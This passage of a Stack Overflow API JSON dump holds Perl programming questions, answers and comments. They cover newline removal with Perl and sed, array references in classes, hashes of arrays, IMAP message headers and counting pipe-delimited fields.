1520697222, "answer_id": 49211039, "question_id": 49210174, "link": "https://stackoverflow.com/questions/49210174/remove-new-lines-except-when-preceded-by-specific-set-of-characters/49211039#49211039", "title": "Remove new lines except when preceded by specific set of characters", "body": "<pre><code>perl -i pe 's/[^.:]\\K\\n/ /' ~/Desktop/bak2\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2285, "user_id": 8592975, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56fea54eef1c73000439a2c38b53d422?s=128&d=identicon&r=PG&f=1", "display_name": "ctac_", "link": "https://stackoverflow.com/users/8592975/ctac"}, "is_accepted": false, "score": 2, "last_activity_date": 1520703980, "creation_date": 1520703980, "answer_id": 49212144, "question_id": 49210174, "link": "https://stackoverflow.com/questions/49210174/remove-new-lines-except-when-preceded-by-specific-set-of-characters/49212144#49212144", "title": "Remove new lines except when preceded by specific set of characters", "body": "<p>With sed</p>\n\n<pre><code>sed -e ':A;/[^.:]$/{N;bA' -e '};y/\\n/ /' ~/Desktop/bak2\n</code></pre>\n\n<p>or gnu sed</p>\n\n<pre><code>sed -z 's/\\([^.:]\\)\\n/\\1 /g' ~/Desktop/bak2\n</code></pre>\n"}], "owner": {"reputation": 169, "user_id": 6423853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pnJxDGD5Stg/AAAAAAAAAAI/AAAAAAAABW0/U05Y-Ishqos/photo.jpg?sz=128", "display_name": "Gabz", "link": "https://stackoverflow.com/users/6423853/gabz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 572, "favorite_count": 1, "accepted_answer_id": 49210333, "answer_count": 3, "score": 3, "last_activity_date": 1520703980, "creation_date": 1520692134, "last_edit_date": 1592644375, "question_id": 49210174, "link": "https://stackoverflow.com/questions/49210174/remove-new-lines-except-when-preceded-by-specific-set-of-characters", "title": "Remove new lines except when preceded by specific set of characters", "body": "<p>How can I remove new lines using <strong>Perl</strong> and / or Sed at the bash command line but avoiding a specific set of characters?</p>\n<p>The closest I came from this is:</p>\n<pre><code>perl -C -i -p -e 's/[^.:]\\n//' ~/Desktop/bak2\n</code></pre>\n<p>The above code is working well on avoid removing lines ended with a dot or a colon, but its failling because when removing the correct new lines its also erasing the very last character of the string. I also would need the removed  \\n to be substituted by a space.</p>\n<p>Would be great, if possible, to have this solution by Perl and also by Sed.\nI've searched for a similar solution in perl or sed and I haven't found it,sorry if it does exists.</p>\n<p>Examples:</p>\n<p>Existing content:</p>\n<blockquote>\n<p>Violets are blue and</p>\n<p>Buda has great teachings.</p>\n<p>Programming can be easy because:</p>\n<p>Stackoverflow exists,</p>\n<p>and the community always helps</p>\n<p>a lot.</p>\n</blockquote>\n<p>Desired output:</p>\n<blockquote>\n<p>Violets are blue and Buda has great teachings.</p>\n<p>Programming can be easy because:</p>\n<p>Stackoverflow exists, and the community always helps a lot.</p>\n</blockquote>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 8, "creation_date": 1520666429, "post_id": 49206370, "comment_id": 85417784, "body": "The code you show cannot print what you show it does. It would print <code>Array is ARRAY(0x...)</code>, because the attribute is arrayref and you need to dereference it -- <code>print &quot;Array is @{$self-&gt;{_array}}\\n&quot;;</code>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 8, "creation_date": 1520666785, "post_id": 49206370, "comment_id": 85417868, "body": "Don&#39;t use <code>new Person(...)</code> but rather <code>Person-&gt;new(...)</code>.  Always have <code>use warnings;</code> and <code>use strict;</code> at the beginning."}], "answers": [{"comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1520683917, "post_id": 49207813, "comment_id": 85422321, "body": "<code>for( my $i=0; $i&lt;=$#{$self-&gt;{_array}}; $i++)</code> is far more readable if it&#39;s written <code>for my $i (0 .. $#{self-&gt;{_array}})</code>"}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1520690990, "post_id": 49207813, "comment_id": 85424484, "body": "@DaveCross IMHO It is more readable for <b>perl</b> programmer.  IMHO <b>perl</b> would not ask this question."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1520703826, "post_id": 49207813, "comment_id": 85428666, "body": "Simpler code is more readable for anyone :-) The C-style <code>for</code> loop gives for more opportunities to introduce fence-post errors."}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1520710589, "post_id": 49207813, "comment_id": 85430893, "body": "True perl programer would write <code>for my $i ($[ .. $#{self-&gt;{_array}})</code> ;-)"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1520710698, "post_id": 49207813, "comment_id": 85430925, "body": "Not in this case - where you need the index for the output"}], "tags": [], "owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "is_accepted": false, "score": -1, "last_activity_date": 1520676411, "creation_date": 1520676411, "answer_id": 49207813, "question_id": 49206370, "link": "https://stackoverflow.com/questions/49206370/how-to-pass-an-array-into-a-class/49207813#49207813", "title": "How to pass an array into a class?", "body": "<p><code>$self-&gt;{_array}</code> is reference to array => derefference it.</p>\n\n<pre><code>my @array = qw(a b c);\n$self-&gt;{_array} = \\@array;    \n\nprint \"Array is @{$self-&gt;{_array}}\\n\";\nprint \" foreach: $_\\n\" foreach @{$self-&gt;{_array}};\nfor( my $i=0; $i&lt;=$#{$self-&gt;{_array}}; $i++) {\n  print \" for: $i:  $self-&gt;{_array}[$i]\\n\";\n}\n</code></pre>\n"}], "owner": {"reputation": 7, "user_id": 3857054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1423a688ca0af2b0791a19bc77e0d59?s=128&d=identicon&r=PG&f=1", "display_name": "user3857054", "link": "https://stackoverflow.com/users/3857054/user3857054"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 129, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1520676411, "creation_date": 1520665773, "last_edit_date": 1520666736, "question_id": 49206370, "link": "https://stackoverflow.com/questions/49206370/how-to-pass-an-array-into-a-class", "title": "How to pass an array into a class?", "body": "<p>I am confused about how to pass an array into a package:</p>\n\n<p>The main code</p>\n\n<pre><code>use Person;\nmy @array=(1,2,3);\n$object = new Person( \"Mohammad\", \"Saleem\",\\@array);\n</code></pre>\n\n<p>package</p>\n\n<pre><code>package Person;\nsub new\n{\n    my $class = shift;\n    my $self = { \n        _firstName =&gt; $_[0],\n        _lastName  =&gt; $_[1],\n        _array  =&gt; $_[2],\n    };      \n    # Print all the values just for clarification.\n    print \"First Name is $self-&gt;{_firstName}\\n\";\n    print \"Last Name is $self-&gt;{_lastName}\\n\";\n    print \"Array is $self-&gt;{_array}\\n\";\n\n    bless $self, $class;\n    return $self;\n}\n</code></pre>\n\n<p>Print the result of the array is empty. How do I fix the code to get the values of the array?</p>\n\n<pre><code>First Name is Mohammad\nLast Name is Saleem\nArray is\n</code></pre>\n"}, {"tags": ["perl", "hash", "collision"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 3, "creation_date": 1520627068, "post_id": 49201496, "comment_id": 85408332, "body": "It would be easier to produce <code>(apple =&gt; [&quot;red&quot;, &quot;green&quot;], orange =&gt; [&quot;orange&quot;])</code>."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1520627735, "post_id": 49201496, "comment_id": 85408640, "body": "In your proposed scheme, how do you distinguish between a key with multiple values and a key with a single value, which is an arrayref?"}], "answers": [{"comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1520627882, "post_id": 49201760, "comment_id": 85408711, "body": "That creates the data structure I was talking about in my comment (<code>(apple =&gt; [&quot;red&quot;, &quot;green&quot;], orange =&gt; [&quot;orange&quot;])</code>). So is that what you needed?"}, {"owner": {"reputation": 244, "user_id": 3417943, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh5.googleusercontent.com/-glDrvb_LcCA/AAAAAAAAAAI/AAAAAAAAABc/-EGpmsXlEkU/photo.jpg?sz=128", "display_name": "landesko", "link": "https://stackoverflow.com/users/3417943/landesko"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1520627927, "post_id": 49201760, "comment_id": 85408742, "body": "Yes! That was what I was looking for. That&#39;s why I provided the example data structure I was looking for in my original question."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1520627948, "post_id": 49201760, "comment_id": 85408756, "body": "Your example is different; it has <code>orange =&gt; &quot;orange&quot;</code>, not <code>orange =&gt; [&quot;orange&quot;]</code>."}, {"owner": {"reputation": 244, "user_id": 3417943, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh5.googleusercontent.com/-glDrvb_LcCA/AAAAAAAAAAI/AAAAAAAAABc/-EGpmsXlEkU/photo.jpg?sz=128", "display_name": "landesko", "link": "https://stackoverflow.com/users/3417943/landesko"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1520628023, "post_id": 49201760, "comment_id": 85408789, "body": "Ah, fair enough. I figured after a little bit of trying that it would be easier to make every value an array. Good catch!"}, {"owner": {"reputation": 170445, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "edited": false, "score": 2, "creation_date": 1520628083, "post_id": 49201760, "comment_id": 85408816, "body": "@landesko Which is what people were trying to tell you in the comments\u2026"}, {"owner": {"reputation": 244, "user_id": 3417943, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh5.googleusercontent.com/-glDrvb_LcCA/AAAAAAAAAAI/AAAAAAAAABc/-EGpmsXlEkU/photo.jpg?sz=128", "display_name": "landesko", "link": "https://stackoverflow.com/users/3417943/landesko"}, "edited": false, "score": 0, "creation_date": 1520628195, "post_id": 49201760, "comment_id": 85408877, "body": "I didn&#39;t catch that at first, you are absolutely right. However, the first commented post was completely off. Also was looking for a possible example."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1520628275, "post_id": 49201760, "comment_id": 85408922, "body": "It was not &quot;completely off&quot;. It was a link to all kinds of ways to create a hash of arrays, including the one you used: <code>push @{ $HoA{&quot;flintstones&quot;} }, &quot;wilma&quot;, &quot;betty&quot;;</code>"}], "tags": [], "owner": {"reputation": 244, "user_id": 3417943, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh5.googleusercontent.com/-glDrvb_LcCA/AAAAAAAAAAI/AAAAAAAAABc/-EGpmsXlEkU/photo.jpg?sz=128", "display_name": "landesko", "link": "https://stackoverflow.com/users/3417943/landesko"}, "is_accepted": true, "score": 0, "last_activity_date": 1520628204, "last_edit_date": 1520628204, "creation_date": 1520627807, "answer_id": 49201760, "question_id": 49201496, "link": "https://stackoverflow.com/questions/49201496/how-to-add-a-duplicate-keys-value-into-a-keyvalue-array-in-perl/49201760#49201760", "title": "How To Add A Duplicate Key&#39;s Value Into A Key:[Value Array] In Perl", "body": "<p>When considering returning values from a SQL query that presented itself like such:</p>\n\n<pre><code>[[apple, \"red\"], [orange, \"orange\"], [apple, \"green\"]]\n</code></pre>\n\n<p>I was able to figure out a good solution to this issue, much easier than the commented solutions on my post. </p>\n\n<pre><code>my %hash;\nforeach my $res (@rs)\n{\n        push @{$hash{$res-&gt;[0]}}, $res-&gt;[1];\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 719, "user_id": 2904411, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/71d5355e354a21dd690910af55725307?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/2904411/chris"}, "edited": false, "score": 1, "creation_date": 1520632198, "post_id": 49202083, "comment_id": 85410639, "body": "List::MoreUtils natatime could be used as an alternative to your non destructive routine."}, {"owner": {"reputation": 719, "user_id": 2904411, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/71d5355e354a21dd690910af55725307?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/2904411/chris"}, "reply_to_user": {"reputation": 244, "user_id": 3417943, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh5.googleusercontent.com/-glDrvb_LcCA/AAAAAAAAAAI/AAAAAAAAABc/-EGpmsXlEkU/photo.jpg?sz=128", "display_name": "landesko", "link": "https://stackoverflow.com/users/3417943/landesko"}, "edited": false, "score": 1, "creation_date": 1520632601, "post_id": 49202083, "comment_id": 85410811, "body": "@landesko given your original post, this is the only viable answer thus far."}], "tags": [], "owner": {"reputation": 2626, "user_id": 849967, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/137c89ef80ed860b95e68b42e0d5353e?s=128&d=identicon&r=PG", "display_name": "Kjetil S.", "link": "https://stackoverflow.com/users/849967/kjetil-s"}, "is_accepted": false, "score": 2, "last_activity_date": 1520629295, "creation_date": 1520629295, "answer_id": 49202083, "question_id": 49201496, "link": "https://stackoverflow.com/questions/49201496/how-to-add-a-duplicate-keys-value-into-a-keyvalue-array-in-perl/49202083#49202083", "title": "How To Add A Duplicate Key&#39;s Value Into A Key:[Value Array] In Perl", "body": "<pre><code>my @pairs=(\n    apple  =&gt; \"red\",\n    orange =&gt; \"orange\",\n    apple  =&gt; \"green\",\n);\nmy %color_of;\npush @{ $color_of{shift@pairs} }, shift@pairs while @pairs;\n@$_==1 and $_=$$_[0] for values %color_of; #one elem arrays becomes scalar\n\nuse Data::Dumper; print Dumper(\\%color_of);\n</code></pre>\n\n<p>If you dont want to destroy <code>@pairs</code>:</p>\n\n<pre><code>my %color_of = sub{ my %h; push@{ $h{shift()} }, shift while@_; %h }-&gt;(@pairs);\n</code></pre>\n"}], "owner": {"reputation": 244, "user_id": 3417943, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh5.googleusercontent.com/-glDrvb_LcCA/AAAAAAAAAAI/AAAAAAAAABc/-EGpmsXlEkU/photo.jpg?sz=128", "display_name": "landesko", "link": "https://stackoverflow.com/users/3417943/landesko"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 117, "favorite_count": 0, "accepted_answer_id": 49201760, "answer_count": 2, "score": -3, "last_activity_date": 1520658885, "creation_date": 1520626485, "last_edit_date": 1520658885, "question_id": 49201496, "link": "https://stackoverflow.com/questions/49201496/how-to-add-a-duplicate-keys-value-into-a-keyvalue-array-in-perl", "title": "How To Add A Duplicate Key&#39;s Value Into A Key:[Value Array] In Perl", "body": "<p>I am trying to add values to arrays in my hash so as to avoid collisions.</p>\n\n<p>Imagine reading in key value pairs like this:</p>\n\n<pre><code>my %color_of = (\n    apple  =&gt; \"red\",\n    orange =&gt; \"orange\",\n    apple  =&gt; \"green\",\n);\n</code></pre>\n\n<p>How can I append the value for <code>apple</code> to an array of values like so?</p>\n\n<pre><code>my %color_of = (\n    apple  =&gt; [\"red\", \"green\"],\n    orange =&gt; \"orange\",\n);\n</code></pre>\n\n<p>Edit: As was suggested a better data structure to create for the collisions is:</p>\n\n<pre><code>my %color_of = (\n    apple  =&gt; [\"red\", \"green\"],\n    orange =&gt; [\"orange\"],\n);    \n</code></pre>\n\n<p>This allows for all values to be pushed into a key's array. </p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": -1, "last_activity_date": 1520620471, "creation_date": 1520620471, "answer_id": 49200098, "question_id": 49200050, "link": "https://stackoverflow.com/questions/49200050/please-describe-the-function-of-this-expression/49200098#49200098", "title": "Please describe the function of this expression", "body": "<p><code>@BLOCK</code> is identical to <code>@NAME</code>, except BLOCK must return a reference to the array to use.</p>\n\n<p><code>$imap-&gt;top($i)</code> apparently returns a reference to an array, in which case <code>@{ $imap-&gt;top($i) }</code> returns the elements of that array.</p>\n"}, {"tags": [], "owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "is_accepted": false, "score": 3, "last_activity_date": 1520624852, "creation_date": 1520624852, "answer_id": 49201124, "question_id": 49200050, "link": "https://stackoverflow.com/questions/49200050/please-describe-the-function-of-this-expression/49201124#49201124", "title": "Please describe the function of this expression", "body": "<pre><code>join '', @{$imap-&gt;top($i)}\n</code></pre>\n\n<p>What this does:</p>\n\n<p>First we get the value of the variable <code>$imap</code>. It's a local variable (declared as <code>my $imap</code> above), and it better contain an object because we're about to call a method on it. (Technically it could also contain a class name, but <code>-&gt;new</code> usually returns an object.)</p>\n\n<p>Then we get the value of the variable <code>$i</code>, which is a local variable in the <code>for</code> loop (usually those are written <code>for my $i (1 .. $count)</code>, though). We pass it as an argument to the <code>top</code> method on the <code>$imap</code> object.</p>\n\n<p>This method then (hopefully) returns a reference to an array because we're about to dereference it. (Technically it could also return an object with an overloaded <code>@{}</code> operation, but that's less likely.)</p>\n\n<p>We dereference the arrayref, which gives us an array. <code>join</code> supplies list context to this operation, so we get the contents of the array as a list.</p>\n\n<p>Finally <code>join</code> takes the values in the list, stringifies them, and concatenates them (using <code>''</code> as the separator, i.e. no separator). The result is a single string.</p>\n"}], "owner": {"reputation": 21, "user_id": 7815967, "user_type": "registered", "profile_image": "https://graph.facebook.com/1284414024979305/picture?type=large", "display_name": "Avinash Utekar", "link": "https://stackoverflow.com/users/7815967/avinash-utekar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1520631602, "creation_date": 1520620267, "last_edit_date": 1520631602, "question_id": 49200050, "link": "https://stackoverflow.com/questions/49200050/please-describe-the-function-of-this-expression", "title": "Please describe the function of this expression", "body": "<p>Here is my Perl code</p>\n\n<p>I want know exactly what happens in the expression <code>join '', @{ $imap-&gt;top($i) }</code></p>\n\n<pre><code>use Email::Simple;\nuse Net::IMAP::Simple::Gmail;\n\nmy $server = 'imap.gmail.com';\n\nmy $imap = Net::IMAP::Simple::Gmail-&gt;new($server);\n$imap-&gt;login( 'user@gmail.com' =&gt; 'user@742' );\n\nmy $nm = $imap-&gt;select('INBOX');\nprint \"Emails Count == \", $nm;\nprint \"\\n\";\n\nprint \"How many emails you wants to read == \";\nmy $count = &lt;STDIN&gt;;\n\nfor (my $i = 1; $i &lt;= $count; $i++ ) {\n    my $es = Email::Simple-&gt;new( join '', @{ $imap-&gt;top($i) } );\n    printf( \"[%03d] %s\\n\\t%s\\n\", $i, $es-&gt;header('From'), $es-&gt;header('Subject') );\n}\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 4232, "user_id": 6772373, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wMTdt.jpg?s=128&g=1", "display_name": "Mike Tung", "link": "https://stackoverflow.com/users/6772373/mike-tung"}, "edited": false, "score": 2, "creation_date": 1520613672, "post_id": 49198303, "comment_id": 85401535, "body": "what&#39;s your issue? It seems like you are on the right track. <a href=\"https://stackoverflow.com/help/mcve\">see</a>"}, {"owner": {"reputation": 43, "user_id": 2901835, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a37f6974851762b54ee0ac3d01b7824b?s=128&d=identicon&r=PG&f=1", "display_name": "user2901835", "link": "https://stackoverflow.com/users/2901835/user2901835"}, "reply_to_user": {"reputation": 4232, "user_id": 6772373, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wMTdt.jpg?s=128&g=1", "display_name": "Mike Tung", "link": "https://stackoverflow.com/users/6772373/mike-tung"}, "edited": false, "score": 0, "creation_date": 1520613946, "post_id": 49198303, "comment_id": 85401715, "body": "@MikeTung i unable to understand how should i create that hash from the file data and increment the values. I am new in perl"}], "answers": [{"comments": [{"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 2, "creation_date": 1520615509, "post_id": 49198416, "comment_id": 85402593, "body": "Might be worth adding why using <code>for</code> is bad in this situation as it&#39;s not immediately obvious what the difference could be if you don&#39;t already know"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520625242, "post_id": 49198416, "comment_id": 85407465, "body": "@choroba: Why do you prefer a postfixed increment in <code>$counts{ $column_names[$i] }++</code>? It&#39;s highly unreadable."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1520632087, "post_id": 49198416, "comment_id": 85410586, "body": "@Borodin: Because of an old habit. Preincrement is probably also faster."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520632893, "post_id": 49198416, "comment_id": 85410924, "body": "@choroba: I would hope that the difference is optimised out if the value of the expression isn&#39;t used, but far too many people use <code>$c++</code> when they really mean <code>++$c</code> just because of the name of the name of the language. Pre-increment is much quicker to understand, especially if the operand is a long expression, because it puts the &quot;verb&quot; first."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520685136, "post_id": 49198416, "comment_id": 85422669, "body": "@choroba @Borodin Just BTW: <code>perl -MO=Deparse -e &#39;$counts{ $column_names[$i] }++ if $columns[$i];&#39;</code> outputs <code>++$counts{$column_names[$i]} if $columns[$i];</code> (and the optree shows that Perl indeed changes it to preinc)"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520718150, "post_id": 49198416, "comment_id": 85433022, "body": "Replaced postincrement with preincrement."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 5, "last_activity_date": 1520718130, "last_edit_date": 1520718130, "creation_date": 1520614025, "answer_id": 49198416, "question_id": 49198303, "link": "https://stackoverflow.com/questions/49198303/split-data-separated-by-pipe-from-a-file-perl/49198416#49198416", "title": "Split data separated by pipe from a file perl", "body": "<p>Don't use <code>for</code> to iterate file lines, use <code>while</code>. The former might exhaust  memory if the file was very large, as it needs to create a list of all the lines; the latter reads one line at a time.</p>\n\n<pre><code>#! /usr/bin/perl\nuse warnings;\nuse strict;\n\nmy @column_names = qw( A B C D E F );\n\nmy %counts;\n\nwhile (&lt;DATA&gt;) {\n    my @columns = split /\\|/;\n    for my $i (0 .. $#column_names) {\n        ++$counts{ $column_names[$i] } if $columns[$i];\n    }\n}\n\nuse Data::Dumper; print Dumper \\%counts;\n\n__DATA__\n0|0|0|1|0|0|ABC|15:44:07|0\n0|0|0|1|0|0|ABC|15:44:07|0\n0|0|0|0|0|0|ABC|15:44:07|0\n0|1|0|0|0|1|ABC|15:44:07|0\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 2901835, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a37f6974851762b54ee0ac3d01b7824b?s=128&d=identicon&r=PG&f=1", "display_name": "user2901835", "link": "https://stackoverflow.com/users/2901835/user2901835"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 92, "favorite_count": 0, "accepted_answer_id": 49198416, "answer_count": 1, "score": 1, "last_activity_date": 1520718130, "creation_date": 1520613587, "question_id": 49198303, "link": "https://stackoverflow.com/questions/49198303/split-data-separated-by-pipe-from-a-file-perl", "title": "Split data separated by pipe from a file perl", "body": "<p>I have a file which i have data pipe seprated having some values 0 ,1 , or some text. Now what i have to do is to read the file line by line and split data seprated by pipe and then if the values of any index is 1 then i have create increment it's value by 1 into a hash so at last i have a hash which will give details how many true values are there in the 